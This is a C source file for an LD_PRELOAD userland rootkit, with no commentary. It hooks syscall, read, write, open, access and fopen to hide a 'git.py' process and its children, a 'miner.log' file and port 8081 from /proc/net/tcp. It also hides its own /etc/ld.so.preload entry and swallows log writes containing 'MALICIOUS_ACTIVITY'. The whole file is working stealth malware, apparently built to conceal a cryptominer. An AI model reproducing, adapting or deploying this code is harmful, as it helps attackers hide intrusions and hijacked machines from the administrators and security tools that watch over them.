    #define _GNU_SOURCE

    #include <stdio.h>
    #include <dlfcn.h>
    #include <dirent.h>
    #include <string.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <ctype.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <errno.h>
    #include <sys/syscall.h>
    #include <stdarg.h>
    #include <limits.h>
    #include <fcntl.h>

    static const char* CMDLINE_TO_FILTER = "git.py";
    static const char* PRELOAD_FILE_PATH = "/etc/ld.so.preload";
    static const char* FILE_TO_FILTER = "miner.log";
    static const char* LOG_SPOOF_TRIGGER = "MALICIOUS_ACTIVITY";
    static const int PORT_TO_HIDE = 8081;

    static long (*original_syscall)(long, ...) = NULL;
    static ssize_t (*original_write)(int, const void*, size_t) = NULL;
    static ssize_t (*original_read)(int, void*, size_t) = NULL;
    static FILE* (*original_fopen)(const char*, const char*) = NULL;
    static int (*original_open)(const char*, int, ...) = NULL;
    static int (*original_access)(const char*, int) = NULL;

    __attribute__((constructor))
    static void initialize_hooks() {
        original_syscall = dlsym(RTLD_NEXT, "syscall");
        original_write = dlsym(RTLD_NEXT, "write");
        original_read = dlsym(RTLD_NEXT, "read");
        original_fopen = dlsym(RTLD_NEXT, "fopen");
        original_open = dlsym(RTLD_NEXT, "open");
        original_access = dlsym(RTLD_NEXT, "access");
    }

    static int get_process_cmdline(const char* pid, char* buf, size_t buf_size) {
        char path[256];
        if (strlen(pid) > (sizeof(path) - 16)) return 0;
        snprintf(path, sizeof(path), "/proc/%s/cmdline", pid);
        FILE* f = original_fopen(path, "r");
        if (!f) return 0;
        ssize_t len = fread(buf, 1, buf_size - 1, f);
        fclose(f);
        if (len <= 0) return 0;
        for (ssize_t i = 0; i < len; ++i) { if (buf[i] == '\0') buf[i] = ' '; }
        buf[len] = '\0';
        return 1;
    }

    static int get_ppid(const char* pid, char* ppid_buf, size_t buf_size) {
        char path[256];
        if (strlen(pid) > (sizeof(path) - 16)) return 0;
        snprintf(path, sizeof(path), "/proc/%s/stat", pid);
        FILE* f = original_fopen(path, "r");
        if (!f) return 0;
        int ppid;
        if (fscanf(f, "%*d %*s %*c %d", &ppid) == 1) {
            snprintf(ppid_buf, buf_size, "%d", ppid);
            fclose(f);
            return 1;
        }
        fclose(f);
        return 0;
    }

    long syscall(long number, ...) {
        if (number == SYS_getdents || number == SYS_getdents64) {
            va_list args;
            va_start(args, number);
            int fd = va_arg(args, int);
            struct dirent* dirp = va_arg(args, struct dirent*);
            unsigned int count = va_arg(args, unsigned int);
            va_end(args);
            long ret = original_syscall(number, fd, dirp, count);
            if (ret <= 0) return ret;
            long processed_bytes = 0;
            struct dirent* current_entry = dirp;
            while (processed_bytes < ret) {
                int should_hide = 0;
                if (strcmp(current_entry->d_name, FILE_TO_FILTER) == 0) {
                    should_hide = 1;
                } else if (strspn(current_entry->d_name, "0123456789") == strlen(current_entry->d_name)) {
                    char cmdline[512] = {0};
                    if (get_process_cmdline(current_entry->d_name, cmdline, sizeof(cmdline)) && strstr(cmdline, CMDLINE_TO_FILTER)) {
                        should_hide = 1;
                    } else {
                        char ppid[32];
                        if (get_ppid(current_entry->d_name, ppid, sizeof(ppid))) {
                            char parent_cmdline[512] = {0};
                            if (get_process_cmdline(ppid, parent_cmdline, sizeof(parent_cmdline)) && strstr(parent_cmdline, CMDLINE_TO_FILTER)) {
                                should_hide = 1;
                            }
                        }
                    }
                }
                if (should_hide) {
                    int entry_len = current_entry->d_reclen;
                    long remaining_bytes = ret - (processed_bytes + entry_len);
                    struct dirent* next_entry = (struct dirent*)((char*)current_entry + entry_len);
                    memmove(current_entry, next_entry, remaining_bytes);
                    ret -= entry_len;
                    continue;
                }
                processed_bytes += current_entry->d_reclen;
                current_entry = (struct dirent*)((char*)dirp + processed_bytes);
            }
            return ret;
        }
        va_list args;
        va_start(args, number);
        long a1 = va_arg(args, long), a2 = va_arg(args, long), a3 = va_arg(args, long);
        long a4 = va_arg(args, long), a5 = va_arg(args, long), a6 = va_arg(args, long);
        va_end(args);
        return original_syscall(number, a1, a2, a3, a4, a5, a6);
    }

    ssize_t read(int fd, void *buf, size_t count) {
        ssize_t ret = original_read(fd, buf, count);
        if (ret <= 0) return ret;

        char fd_path[256], proc_path[256];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
        ssize_t path_len = readlink(fd_path, proc_path, sizeof(proc_path) - 1);

        if (path_len > 0) {
            proc_path[path_len] = '\0';
            if (strcmp(proc_path, "/proc/net/tcp") == 0 || strcmp(proc_path, "/proc/net/tcp6") == 0) {
                char hex_port[16];
                snprintf(hex_port, sizeof(hex_port), ":%04X", PORT_TO_HIDE);
                char* temp_buf = (char*)malloc(ret);
                if (!temp_buf) return ret;
                
                char* line_start = (char*)buf;
                char* write_ptr = temp_buf;
                ssize_t filtered_len = 0;

                for (ssize_t i = 0; i < ret; ++i) {
                    if (line_start[i] == '\n' || i == ret - 1) {
                        ssize_t line_len = &line_start[i] - line_start + 1;
                        if (memmem(line_start, line_len, hex_port, strlen(hex_port)) == NULL) {
                            memcpy(write_ptr, line_start, line_len);
                            write_ptr += line_len;
                            filtered_len += line_len;
                        }
                        line_start = &line_start[i] + 1;
                    }
                }
                memcpy(buf, temp_buf, filtered_len);
                free(temp_buf);
                return filtered_len;
            }
        }
        return ret;
    }

    int open(const char *pathname, int flags, ...) {
        char resolved_path[PATH_MAX];
        if (realpath(pathname, resolved_path)) {
            if (strcmp(resolved_path, PRELOAD_FILE_PATH) == 0 || strcmp(resolved_path, FILE_TO_FILTER) == 0) {
                errno = ENOENT;
                return -1;
            }
        }
        mode_t mode = 0;
        if (flags & O_CREAT) {
            va_list args;
            va_start(args, flags);
            mode = va_arg(args, mode_t);
            va_end(args);
        }
        return original_open(pathname, flags, mode);
    }

    int access(const char *pathname, int mode) {
        char resolved_path[PATH_MAX];
        if (realpath(pathname, resolved_path)) {
            if (strcmp(resolved_path, PRELOAD_FILE_PATH) == 0 || strcmp(resolved_path, FILE_TO_FILTER) == 0) {
                errno = ENOENT;
                return -1;
            }
        }
        return original_access(pathname, mode);
    }

    ssize_t write(int fd, const void *buf, size_t count) {
        if (memmem(buf, count, LOG_SPOOF_TRIGGER, strlen(LOG_SPOOF_TRIGGER)) != NULL) {
            return count;
        }
        return original_write(fd, buf, count);
    }

    FILE* fopen(const char *path, const char *mode) {
        char resolved_path[PATH_MAX];
        if (realpath(path, resolved_path)) {
            if (strcmp(resolved_path, PRELOAD_FILE_PATH) == 0 || strcmp(resolved_path, FILE_TO_FILTER) == 0) {
                errno = ENOENT;
                return NULL;
            }
        }
        return original_fopen(path, mode);
    }
